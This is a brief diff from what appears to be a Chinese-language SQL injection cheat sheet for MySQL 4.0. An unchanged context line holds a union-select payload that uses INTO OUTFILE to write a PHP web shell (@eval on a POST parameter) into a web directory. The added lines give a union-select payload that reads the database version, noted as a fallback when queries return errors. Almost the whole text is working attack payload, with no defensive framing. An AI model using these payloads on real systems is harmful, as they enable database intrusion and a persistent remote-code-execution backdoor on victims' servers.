@@ -51,3 +51,5 @@ mysql4.0
   and 1=2 union select 1,"<?php @eval($_POST['test']);?>",3,4,5 into outfile 'c:/wwwroot/xxx/test.php'
   
   
+ 判断数据库版本信息(遇到查询错误)：and 1=2 union select 1,unhex(hex(@@version))/*
+ 
